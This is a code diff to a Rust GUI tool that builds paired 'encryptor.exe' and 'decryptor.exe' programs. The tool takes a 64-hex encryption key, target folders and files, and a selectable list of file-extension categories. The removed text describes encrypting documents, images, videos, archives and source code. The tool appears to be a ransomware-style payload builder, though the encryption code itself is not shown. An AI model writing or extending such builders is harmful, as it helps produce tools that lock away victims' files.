@@ -1,4 +1,4 @@
-use crate::models::{BuilderApp, LogEntry, PathEntry};
+use crate::models::{BuilderApp, FileExtension, LogEntry, PathEntry, EXTENSIONS};
 use chrono::Local;
 use std::path::PathBuf;
 use std::process::Command;
@@ -15,8 +15,26 @@ impl BuilderApp {
 			logs: Vec::new(),
 			encrypt_exe_name: "encryptor.exe".to_string(),
 			decrypt_exe_name: "decryptor.exe".to_string(),
-			encrypt_only_target: true,
+			extensions: Self::init_extensions(),
+			use_custom_extensions: false,
+			custom_extensions_input: String::new(),
+			select_all_categories: true,
+			open_categories: Vec::new()
 		}
+	}
+
+	fn init_extensions() -> Vec<FileExtension> {
+		let mut exts = Vec::new();
+		for (category, ext_list) in EXTENSIONS {
+			for ext in *ext_list {
+				exts.push(FileExtension {
+					name: ext.to_string(),
+					enabled: true,
+					category: category.to_string(),
+				});
+			}
+		}
+		exts
 	}
 
 	fn add_log(&mut self, message: String, is_error: bool) {
@@ -44,6 +62,21 @@ impl BuilderApp {
 			self.add_log(format!("❌ Removed path: {}", removed.path), false);
 		}
 	}
+
+	fn toggle_extension(&mut self, index: usize) {
+		if index < self.extensions.len() {
+			self.extensions[index].enabled = !self.extensions[index].enabled;
+		}
+	}
+
+	fn get_enabled_extensions(&self) -> String {
+		if self.use_custom_extensions { return self.custom_extensions_input.clone(); }
+
+		let enabled: Vec<String> = self.extensions.iter().filter(|e| e.enabled).map(|e| e.name.clone()).collect();
+		enabled.join(",")
+	}
+
+	fn select_all(&mut self, enabled: bool) { for ext in &mut self.extensions { ext.enabled = enabled; } }
 
 	fn create_encryptor(&mut self) {
 		if self.key_hex.len() != 64 {
@@ -81,6 +114,8 @@ impl BuilderApp {
 		// Подготавливаем пути для компиляции
 		let paths_str = self.paths.iter().map(|p| p.path.clone()).collect::<Vec<_>>().join("|");
 
+		let extensions_str = if !self.extensions.is_empty() { self.get_enabled_extensions() } else { "".to_string() };
+
 		// Проверяем наличие cargo
 		let cargo_check = Command::new("cargo").arg("--version").output();
 		if cargo_check.is_err() {
@@ -99,7 +134,7 @@ impl BuilderApp {
 			.env("ENCRYPTION_KEY", &self.key_hex)
 			.env("TARGET_PATHS", &paths_str)
 			.env("OPERATION_MODE", &mode)
-			.env("FILTER_ONLY_TARGET", self.encrypt_only_target.to_string())
+			.env("ALLOWED_EXTENSIONS", &extensions_str)
 			.current_dir(&encryptor_src)
 			.status();
 
@@ -153,164 +188,268 @@ impl eframe::App for BuilderApp {
 			ui.separator();
 
 			// Две колонки
-			egui::SidePanel::left("settings").default_width(400.0).show(ctx, |ui| {
-				ui.add_space(10.0);
+			egui::SidePanel::left("settings")
+				.default_width(400.0)
+				.min_width(350.0)
+				.resizable(true)
+				.show(ctx, |ui| {
+					// Добавляем скролл для всей левой панели
+					egui::ScrollArea::vertical()
+						.id_source("left_panel_scroll")
+						.auto_shrink([false; 2])
+						.show(ui, |ui| {
+							ui.add_space(10.0);
 
-				// Настройки фильтрации
-				ui.label("🎯 Encryption Filter:");
-				ui.checkbox(&mut self.encrypt_only_target, "Only encrypt specific extensions (recommended)");
-				if self.encrypt_only_target {
-					ui.colored_label(egui::Color32::LIGHT_BLUE, "Will encrypt: documents, images, videos, archives, source code");
-				} else {
-					ui.colored_label(egui::Color32::LIGHT_YELLOW, "Will encrypt all files except system/executable");
-				}
+							ui.horizontal(|ui| {
+								ui.checkbox(&mut self.use_custom_extensions, "Use custom extensions");
+								if ui.button("📋 Select All").clicked() {
+									self.select_all(true);
+								}
+								if ui.button("🗑️ Clear All").clicked() {
+									self.select_all(false);
+								}
+							});
 
-				ui.add_space(10.0);
-				ui.separator();
+							if self.use_custom_extensions {
+								ui.label("Custom extensions (comma-separated):");
+								ui.text_edit_multiline(&mut self.custom_extensions_input);
+								ui.colored_label(egui::Color32::LIGHT_BLUE,
+								                 "Example: txt,doc,pdf,jpg,png,rs,py,js");
+							} else {
+								ui.label("Select file types to encrypt:");
+								ui.add_space(5.0);
 
-				// Ключ
-				ui.label("🔑 Encryption Key (64 hex characters):");
-				ui.horizontal(|ui| {
-					ui.text_edit_singleline(&mut self.key_hex);
-					if ui.button("🎲 Random").clicked() {
-						self.key_hex = (0..32)
-							.map(|_| format!("{:02x}", rand::random::<u8>()))
-							.collect();
-						self.add_log("🎲 Generated new random key".to_string(), false);
-					}
-				});
+								// Добавляем скролл для списка расширений
+								egui::ScrollArea::vertical()
+									.id_source("extensions_scroll")
+									.max_height(300.0)
+									.show(ui, |ui| {
+										let mut categories: Vec<String> = self.extensions
+											.iter()
+											.map(|e| e.category.clone())
+											.collect::<std::collections::HashSet<_>>()
+											.into_iter()
+											.collect();
+										categories.sort();
 
-				if !self.key_hex.is_empty() && self.key_hex.len() != 64 {
-					ui.colored_label(egui::Color32::RED, format!("Length: {}/64", self.key_hex.len()));
-				} else if self.key_hex.len() == 64 {
-					ui.colored_label(egui::Color32::GREEN, "✓ Valid key");
-				}
+										for category in categories {
+											let is_open = self.open_categories.contains(&category);
+											let category_exts: Vec<usize> = self.extensions
+												.iter()
+												.enumerate()
+												.filter(|(_, e)| e.category == category)
+												.map(|(i, _)| i)
+												.collect();
 
-				ui.add_space(10.0);
-				ui.separator();
+											let enabled_count = category_exts.iter()
+												.filter(|&&i| self.extensions[i].enabled)
+												.count();
+											let total_count = category_exts.len();
 
-				// Список путей
-				ui.label("📁 Paths to process:");
+											let all_enabled = enabled_count == total_count;
 
-				// Добавление нового пути
-				ui.horizontal(|ui| {
-					ui.text_edit_singleline(&mut self.new_path);
-					if ui.button("📂 Add folder").clicked() {
-						if !self.new_path.is_empty() {
-							self.add_path(self.new_path.clone(), false);
-							self.new_path.clear();
-						}
-					}
-					if ui.button("📂 Add file").clicked() {
-						if !self.new_path.is_empty() {
-							self.add_path(self.new_path.clone(), true);
-							self.new_path.clear();
-						}
-					}
-				});
+											ui.horizontal(|ui| {
+												// Чекбокс для всей категории
+												let mut category_enabled = all_enabled;
+												let response = ui.checkbox(&mut category_enabled, "");
+												if response.changed() {
+													for &idx in &category_exts {
+														self.extensions[idx].enabled = category_enabled;
+													}
+												}
 
-				ui.add_space(5.0);
+												// Collapsing заголовок с названием категории
+												let collapsing = egui::CollapsingHeader::new(format!("📁 {} ({}/{})", category, enabled_count, total_count))
+													.id_source(format!("cat_{}", category))
+													.default_open(is_open);
 
-				// Отображение списка путей
-				if !self.paths.is_empty() {
-					egui::Frame::group(ui.style()).show(ui, |ui| {
-						egui::ScrollArea::vertical().id_source("paths_scroll_area").max_height(150.0).show(ui, |ui| {
-							let paths_clone: Vec<PathEntry> = self.paths.clone();
-							for entry in paths_clone.iter() {
-								ui.horizontal(|ui| {
-									let icon = if entry.is_file { "📄" } else { "📁" };
-									ui.label(format!("{} {}", icon, entry.path));
-									if ui.small_button("❌").clicked() {
-										if let Some(original_index) = self.paths.iter().position(|p| p.path == entry.path) {
-											self.remove_path(original_index);
+												let header_response = collapsing.show(ui, |ui| {
+													for &idx in &category_exts {
+														ui.horizontal(|ui| {
+															ui.add_space(20.0);
+															let mut enabled = self.extensions[idx].enabled;
+															let response = ui.checkbox(&mut enabled, &self.extensions[idx].name);
+															if response.changed() {
+																self.extensions[idx].enabled = enabled;
+															}
+														});
+													}
+												});
+
+												// Обновляем состояние открытия категории
+												if header_response.header_response.clicked() {
+													if is_open {
+														self.open_categories.retain(|c| c != &category);
+													} else {
+														self.open_categories.push(category);
+													}
+												}
+											});
 										}
+									});
+
+								let selected_count = self.extensions.iter().filter(|e| e.enabled).count();
+								ui.separator();
+								ui.label(format!("📊 Selected: {}/{} extensions", selected_count, self.extensions.len()));
+							}
+
+							ui.colored_label(egui::Color32::LIGHT_BLUE, "💡 Tip: Click checkbox to enable/disable entire category");
+
+							ui.add_space(10.0);
+							ui.separator();
+
+							// Ключ
+							ui.label("🔑 Encryption Key (64 hex characters):");
+							ui.horizontal(|ui| {
+								ui.text_edit_singleline(&mut self.key_hex);
+								if ui.button("🎲 Random").clicked() {
+									self.key_hex = (0..32)
+										.map(|_| format!("{:02x}", rand::random::<u8>()))
+										.collect();
+									self.add_log("🎲 Generated new random key".to_string(), false);
+								}
+							});
+
+							if !self.key_hex.is_empty() && self.key_hex.len() != 64 {
+								ui.colored_label(egui::Color32::RED, format!("Length: {}/64", self.key_hex.len()));
+							} else if self.key_hex.len() == 64 {
+								ui.colored_label(egui::Color32::GREEN, "✓ Valid key");
+							}
+
+							ui.add_space(10.0);
+							ui.separator();
+
+							// Список путей
+							ui.label("📁 Paths to process:");
+
+							// Добавление нового пути
+							ui.horizontal(|ui| {
+								ui.text_edit_singleline(&mut self.new_path);
+								if ui.button("📂 Add folder").clicked() {
+									if !self.new_path.is_empty() {
+										self.add_path(self.new_path.clone(), false);
+										self.new_path.clear();
 									}
+								}
+								if ui.button("📂 Add file").clicked() {
+									if !self.new_path.is_empty() {
+										self.add_path(self.new_path.clone(), true);
+										self.new_path.clear();
+									}
+								}
+							});
+
+							ui.add_space(5.0);
+
+							// Отображение списка путей
+							if !self.paths.is_empty() {
+								egui::Frame::group(ui.style()).show(ui, |ui| {
+									egui::ScrollArea::vertical()
+										.id_source("paths_scroll_area")
+										.max_height(150.0)
+										.show(ui, |ui| {
+											let paths_clone: Vec<PathEntry> = self.paths.clone();
+											for entry in paths_clone.iter() {
+												ui.horizontal(|ui| {
+													let icon = if entry.is_file { "📄" } else { "📁" };
+													ui.label(format!("{} {}", icon, entry.path));
+													if ui.small_button("❌").clicked() {
+														if let Some(original_index) = self.paths.iter().position(|p| p.path == entry.path) {
+															self.remove_path(original_index);
+														}
+													}
+												});
+											}
+										});
 								});
+							} else {
+								ui.colored_label(egui::Color32::GRAY, "No paths added yet");
+							}
+
+							ui.add_space(10.0);
+							ui.separator();
+
+							// Создание encryptor и decryptor
+							ui.label("🔧 Generate executables:");
+
+							ui.horizontal(|ui| {
+								ui.label("Encryptor name:");
+								ui.text_edit_singleline(&mut self.encrypt_exe_name);
+								if !self.encrypt_exe_name.ends_with(".exe") && !self.encrypt_exe_name.is_empty() {
+									self.encrypt_exe_name.push_str(".exe");
+								}
+							});
+
+							if ui.button("🔒 Create Encryptor").clicked() {
+								self.create_encryptor();
+							}
+
+							ui.add_space(5.0);
+
+							ui.horizontal(|ui| {
+								ui.label("Decryptor name:");
+								ui.text_edit_singleline(&mut self.decrypt_exe_name);
+								if !self.decrypt_exe_name.ends_with(".exe") && !self.decrypt_exe_name.is_empty() {
+									self.decrypt_exe_name.push_str(".exe");
+								}
+							});
+
+							if ui.button("🔓 Create Decryptor").clicked() {
+								self.create_decryptor();
+							}
+
+							ui.add_space(10.0);
+
+							// Статус
+							ui.separator();
+							ui.label("📊 Status:");
+							let status_text = &self.status;
+							if status_text.starts_with("✅") {
+								ui.colored_label(egui::Color32::LIGHT_GREEN, status_text);
+							} else if status_text.starts_with("❌") {
+								ui.colored_label(egui::Color32::LIGHT_RED, status_text);
+							} else {
+								ui.label(status_text);
 							}
 						});
-					});
-				} else {
-					ui.colored_label(egui::Color32::GRAY, "No paths added yet");
-				}
-
-				ui.add_space(10.0);
-				ui.separator();
-
-				// Создание encryptor и decryptor
-				ui.label("🔧 Generate executables:");
-
-				ui.horizontal(|ui| {
-					ui.label("Encryptor name:");
-					ui.text_edit_singleline(&mut self.encrypt_exe_name);
-					if !self.encrypt_exe_name.ends_with(".exe") && !self.encrypt_exe_name.is_empty() {
-						self.encrypt_exe_name.push_str(".exe");
-					}
 				});
-
-				if ui.button("🔒 Create Encryptor").clicked() {
-					self.create_encryptor();
-				}
-
-				ui.add_space(5.0);
-
-				ui.horizontal(|ui| {
-					ui.label("Decryptor name:");
-					ui.text_edit_singleline(&mut self.decrypt_exe_name);
-					if !self.decrypt_exe_name.ends_with(".exe") && !self.decrypt_exe_name.is_empty() {
-						self.decrypt_exe_name.push_str(".exe");
-					}
-				});
-
-				if ui.button("🔓 Create Decryptor").clicked() {
-					self.create_decryptor();
-				}
-
-				ui.add_space(10.0);
-
-				// Статус
-				ui.separator();
-				ui.label("📊 Status:");
-				let status_text = &self.status;
-				if status_text.starts_with("✅") {
-					ui.colored_label(egui::Color32::LIGHT_GREEN, status_text);
-				} else if status_text.starts_with("❌") {
-					ui.colored_label(egui::Color32::LIGHT_RED, status_text);
-				} else {
-					ui.label(status_text);
-				}
-			});
 
 			// Правая панель с логами
-			egui::SidePanel::right("logs_panel").default_width(ui.available_width() - 400.0).show(ctx, |ui| {
-				ui.heading("📋 Activity Log");
-				ui.separator();
+			egui::SidePanel::right("logs_panel")
+				.default_width(ui.available_width() - 400.0)
+				.min_width(250.0)
+				.resizable(true)
+				.show(ctx, |ui| {
+					ui.heading("📋 Activity Log");
+					ui.separator();
 
-				egui::ScrollArea::vertical().id_source("logs_scroll_area")
-					.max_height(ui.available_height() - 50.0)
-					.stick_to_bottom(true)
-					.show(ui, |ui| {
-						let logs_clone: Vec<LogEntry> = self.logs.clone();
-						for log in logs_clone.iter().rev() {
-							if log.is_error {
-								ui.colored_label(egui::Color32::LIGHT_RED,
-								                 format!("[{}] {}", log.timestamp, log.message));
-							} else {
-								ui.colored_label(egui::Color32::LIGHT_GREEN,
-								                 format!("[{}] {}", log.timestamp, log.message));
+					egui::ScrollArea::vertical()
+						.id_source("logs_scroll_area")
+						.max_height(ui.available_height() - 50.0)
+						.stick_to_bottom(true)
+						.show(ui, |ui| {
+							let logs_clone: Vec<LogEntry> = self.logs.clone();
+							for log in logs_clone.iter().rev() {
+								if log.is_error {
+									ui.colored_label(egui::Color32::LIGHT_RED,
+									                 format!("[{}] {}", log.timestamp, log.message));
+								} else {
+									ui.colored_label(egui::Color32::LIGHT_GREEN,
+									                 format!("[{}] {}", log.timestamp, log.message));
+								}
 							}
-						}
 
-						if self.logs.is_empty() {
-							ui.colored_label(egui::Color32::GRAY, "No activity yet");
-						}
-					});
+							if self.logs.is_empty() {
+								ui.colored_label(egui::Color32::GRAY, "No activity yet");
+							}
+						});
 
-				ui.add_space(5.0);
-				if ui.button("🗑️ Clear Log").clicked() {
-					self.logs.clear();
-					self.add_log("Log cleared".to_string(), false);
-				}
-			});
+					ui.add_space(5.0);
+					if ui.button("🗑️ Clear Log").clicked() {
+						self.logs.clear();
+						self.add_log("Log cleared".to_string(), false);
+					}
+				});
 		});
 	}
 }
